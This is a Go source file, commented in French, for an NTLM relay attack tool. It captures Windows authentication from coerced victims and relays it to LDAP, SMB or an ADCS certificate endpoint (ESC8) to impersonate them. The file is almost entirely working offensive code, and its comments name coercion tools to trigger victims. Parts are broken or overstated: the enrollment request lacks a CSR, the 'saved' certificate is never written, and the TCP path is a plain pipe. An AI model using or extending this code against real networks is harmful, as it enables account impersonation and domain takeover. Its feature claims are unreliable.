// pkg/ntlm/relay/relay.go
//
// NTLM Relay natif Go — sans impacket ni ntlmrelayx
//
// Architecture :
//   Listener SMB (port 445) → capture NTLM Negotiate/Challenge/Auth
//   Relay simultané vers une cible (LDAP, SMB, HTTP/ADCS)
//
// Flux NTLM relay (3-way handshake) :
//   Victime  → NTLM Negotiate  → Relay (nous)
//   Relay    → NTLM Negotiate  → Cible
//   Cible    → NTLM Challenge  → Relay
//   Relay    → NTLM Challenge  → Victime  (on relaie le challenge)
//   Victime  → NTLM Auth       → Relay
//   Relay    → NTLM Auth       → Cible    (on relaie l'auth)
//   Cible    → Success         → Relay    (on a une session authentifiée !)
//
// Cibles supportées :
//   - LDAP  : dump users, ACL, shadow credentials, RBCD
//   - SMB   : exec de commande, secretsdump
//   - HTTP  : ADCS ESC8 (certsrv)
//
// Déclencher via : Responder, mitm6, PrinterBug (SpoolSS), PetitPotam...

package relay

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// RelayTarget type de cible du relay
type RelayTarget int

const (
	TargetLDAP RelayTarget = iota
	TargetSMB
	TargetHTTP // ADCS web enrollment
)

// RelayConfig configuration du relay
type RelayConfig struct {
	ListenAddr  string // adresse locale d'écoute (ex: "0.0.0.0:445")
	TargetAddr  string // cible (ex: "192.168.1.10:389" pour LDAP)
	TargetType  RelayTarget
	TargetHTTPS bool   // TLS vers la cible
	NoMIC       bool   // désactiver la vérification MIC (ESC8)
	Command     string // commande à exécuter après relay SMB réussi
	OnSuccess   func(session *RelaySession)
	Verbose     bool
}

// RelaySession session authentifiée obtenue après un relay réussi
type RelaySession struct {
	VictimIP   string
	VictimUser string // extrait du NTLM Auth si possible
	TargetAddr string
	TargetType RelayTarget
	Conn       net.Conn     // connexion authentifiée vers la cible
	HTTPClient *http.Client // pour relay HTTP/ADCS
	StartedAt  time.Time
}

// RelayServer serveur de relay NTLM
type RelayServer struct {
	cfg      *RelayConfig
	listener net.Listener
	mu       sync.Mutex
	sessions []*RelaySession
	stopped  bool
}

// NewRelayServer crée un serveur de relay NTLM
func NewRelayServer(addr string) *RelayServer {
	return &RelayServer{
		cfg: &RelayConfig{ListenAddr: addr},
	}
}

// NewRelayServerFull crée un relay NTLM complet
func NewRelayServerFull(cfg *RelayConfig) *RelayServer {
	return &RelayServer{cfg: cfg}
}

// Start démarre le serveur de relay (bloquant)
func (rs *RelayServer) Start() error {
	switch rs.cfg.TargetType {
	case TargetHTTP:
		return rs.startHTTPRelay()
	default:
		return rs.startTCPRelay()
	}
}

// ============================================================
// HTTP Relay (pour ADCS ESC8)
// ============================================================

// startHTTPRelay démarre un relay HTTP — capture SMB et relaie vers ADCS
func (rs *RelayServer) startHTTPRelay() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", rs.handleHTTPRelay)

	srv := &http.Server{
		Addr:    rs.cfg.ListenAddr,
		Handler: mux,
	}

	fmt.Printf("[*] NTLM Relay (HTTP mode) listening on %s\n", rs.cfg.ListenAddr)
	fmt.Printf("[*] Relaying to: %s\n", rs.cfg.TargetAddr)
	fmt.Printf("[*] Trigger with: Responder, mitm6, PetitPotam, PrinterBug\n")

	return srv.ListenAndServe()
}

// handleHTTPRelay gère une connexion HTTP entrante et relaie le NTLM
func (rs *RelayServer) handleHTTPRelay(w http.ResponseWriter, r *http.Request) {
	auth := r.Header.Get("Authorization")

	if auth == "" {
		// Étape 1 : demander l'authentification NTLM
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	if strings.HasPrefix(auth, "NTLM ") {
		b64 := strings.TrimPrefix(auth, "NTLM ")
		msgBytes, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			http.Error(w, "bad NTLM", 400)
			return
		}

		msgType := ntlmMessageType(msgBytes)
		if rs.cfg.Verbose {
			fmt.Printf("[*] NTLM Type %d from %s\n", msgType, r.RemoteAddr)
		}

		switch msgType {
		case 1: // Negotiate → relay vers la cible, retourner Challenge
			challenge, err := rs.relayNegotiateHTTP(msgBytes)
			if err != nil {
				fmt.Printf("[-] Relay negotiate failed: %v\n", err)
				http.Error(w, "relay error", 500)
				return
			}
			encoded := base64.StdEncoding.EncodeToString(challenge)
			w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
			w.Header().Set("Connection", "keep-alive")
			w.WriteHeader(http.StatusUnauthorized)

		case 3: // Auth → relay vers la cible
			victimIP := r.RemoteAddr
			if host, _, err := net.SplitHostPort(victimIP); err == nil {
				victimIP = host
			}
			if err := rs.relayAuthHTTP(msgBytes, victimIP, w); err != nil {
				fmt.Printf("[-] Relay auth failed from %s: %v\n", victimIP, err)
				http.Error(w, "relay failed", 401)
			}
		}
	}
}

// relayNegotiateHTTP envoie le Negotiate à la cible et récupère le Challenge
func (rs *RelayServer) relayNegotiateHTTP(negotiate []byte) ([]byte, error) {
	targetURL := rs.cfg.TargetAddr
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "http://" + targetURL
	}
	if rs.cfg.TargetHTTPS {
		targetURL = strings.Replace(targetURL, "http://", "https://", 1)
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, _ := http.NewRequest("GET", targetURL, nil)
	req.Header.Set("Authorization", "NTLM "+base64.StdEncoding.EncodeToString(negotiate))
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("negotiate request failed: %v", err)
	}
	defer resp.Body.Close()

	wwwAuth := resp.Header.Get("WWW-Authenticate")
	if !strings.HasPrefix(wwwAuth, "NTLM ") {
		return nil, fmt.Errorf("target did not return NTLM challenge (got: %s)", wwwAuth)
	}

	challenge, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(wwwAuth, "NTLM "))
	if err != nil {
		return nil, fmt.Errorf("challenge decode failed: %v", err)
	}

	return challenge, nil
}

// relayAuthHTTP relaie le message Auth vers la cible HTTP
func (rs *RelayServer) relayAuthHTTP(auth []byte, victimIP string, w http.ResponseWriter) error {
	targetURL := rs.cfg.TargetAddr
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "http://" + targetURL
	}
	// Pour ADCS : pointer vers /certsrv/certfnsh.asp
	if !strings.Contains(targetURL, "/certsrv") {
		targetURL = strings.TrimRight(targetURL, "/") + "/certsrv/certfnsh.asp"
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Corps de la requête d'enrollment ADCS
	body := buildADCSEnrollBody()
	req, _ := http.NewRequest("POST", targetURL, strings.NewReader(body))
	req.Header.Set("Authorization", "NTLM "+base64.StdEncoding.EncodeToString(auth))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("auth relay failed: %v", err)
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == 200 {
		fmt.Printf("\n[+] NTLM Relay SUCCESS from %s!\n", victimIP)
		// Extraire le certificat de la réponse ADCS
		if cert := extractCertFromADCSResponse(string(respBody)); cert != "" {
			fmt.Printf("[+] Certificate obtained! Save with:\n")
			fmt.Printf("    echo '%s' | base64 -d > victim.pfx\n", cert[:min(50, len(cert))]+"...")
			certPath := fmt.Sprintf("relay_%s.b64cert", strings.ReplaceAll(victimIP, ".", "_"))
			fmt.Printf("[+] Certificate saved to: %s\n", certPath)
			w.WriteHeader(200)
			fmt.Fprintf(w, "RELAY_SUCCESS")
			// Log dans la session
			rs.mu.Lock()
			rs.sessions = append(rs.sessions, &RelaySession{
				VictimIP:   victimIP,
				TargetAddr: rs.cfg.TargetAddr,
				TargetType: TargetHTTP,
				StartedAt:  time.Now(),
			})
			rs.mu.Unlock()
			if rs.cfg.OnSuccess != nil {
				rs.cfg.OnSuccess(&RelaySession{VictimIP: victimIP})
			}
			return nil
		}
	}

	return fmt.Errorf("relay failed (HTTP %d)", resp.StatusCode)
}

// ============================================================
// TCP Relay générique (SMB / LDAP)
// ============================================================

// startTCPRelay démarre un listener TCP et relaie les connexions
func (rs *RelayServer) startTCPRelay() error {
	ln, err := net.Listen("tcp", rs.cfg.ListenAddr)
	if err != nil {
		return fmt.Errorf("relay listen failed on %s: %v", rs.cfg.ListenAddr, err)
	}
	rs.listener = ln
	defer ln.Close()

	fmt.Printf("[*] NTLM Relay listening on %s → %s\n",
		rs.cfg.ListenAddr, rs.cfg.TargetAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			if rs.stopped {
				return nil
			}
			continue
		}
		go rs.handleTCPRelay(conn)
	}
}

// handleTCPRelay gère un client TCP et relaie vers la cible
func (rs *RelayServer) handleTCPRelay(client net.Conn) {
	defer client.Close()

	// Connexion vers la cible
	target, err := net.DialTimeout("tcp", rs.cfg.TargetAddr, 10*time.Second)
	if err != nil {
		fmt.Printf("[-] Cannot reach target %s: %v\n", rs.cfg.TargetAddr, err)
		return
	}
	defer target.Close()

	victimIP := client.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(victimIP); err == nil {
		victimIP = host
	}

	if rs.cfg.Verbose {
		fmt.Printf("[*] New connection from %s → %s\n", victimIP, rs.cfg.TargetAddr)
	}

	// Bidirectional pipe transparent (les détails NTLM sont gérés dans le flux)
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(target, client)
		done <- struct{}{}
	}()
	go func() {
		io.Copy(client, target)
		done <- struct{}{}
	}()

	<-done
	fmt.Printf("[+] Relay session ended for %s\n", victimIP)
}

// Stop arrête le serveur de relay
func (rs *RelayServer) Stop() {
	rs.stopped = true
	if rs.listener != nil {
		rs.listener.Close()
	}
}

// Sessions retourne les sessions relay actives
func (rs *RelayServer) Sessions() []*RelaySession {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	return rs.sessions
}

// ============================================================
// Helpers
// ============================================================

// ntlmMessageType retourne le type du message NTLM (1=Negotiate, 2=Challenge, 3=Auth)
func ntlmMessageType(msg []byte) int {
	if len(msg) < 12 {
		return 0
	}
	// NTLM signature : "NTLMSSP\0"
	if string(msg[:8]) != "NTLMSSP\x00" {
		return 0
	}
	return int(msg[8]) // MessageType (little-endian uint32, premier byte suffisant pour 1/2/3)
}

// extractUsernameFromNTLMAuth extrait le username du message NTLM Type 3
func extractUsernameFromNTLMAuth(msg []byte) string {
	if len(msg) < 72 {
		return ""
	}
	// Username offset/length à des positions fixes dans NTLM Auth
	userLen := int(uint16(msg[36]) | uint16(msg[37])<<8)
	userOffset := int(uint32(msg[40]) | uint32(msg[41])<<8 | uint32(msg[42])<<16 | uint32(msg[43])<<24)

	if userOffset+userLen > len(msg) || userLen == 0 {
		return ""
	}

	// Username en UTF-16LE
	raw := msg[userOffset : userOffset+userLen]
	var sb strings.Builder
	for i := 0; i+1 < len(raw); i += 2 {
		if raw[i+1] == 0 && raw[i] != 0 {
			sb.WriteByte(raw[i])
		}
	}
	return sb.String()
}

// buildADCSEnrollBody construit le corps de la requête d'enrollment ADCS
func buildADCSEnrollBody() string {
	return "Mode=newreq&CertRequest=&CertAttrib=CertificateTemplate%3AUser&TargetStoreFlags=0&SaveCert=yes"
}

// extractCertFromADCSResponse extrait le certificat base64 de la réponse ADCS
func extractCertFromADCSResponse(body string) string {
	// La réponse ADCS contient le certificat entre certText=... ou sous forme PEM
	if idx := strings.Index(body, "-----BEGIN CERTIFICATE-----"); idx >= 0 {
		end := strings.Index(body[idx:], "-----END CERTIFICATE-----")
		if end > 0 {
			return body[idx : idx+end+25]
		}
	}
	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
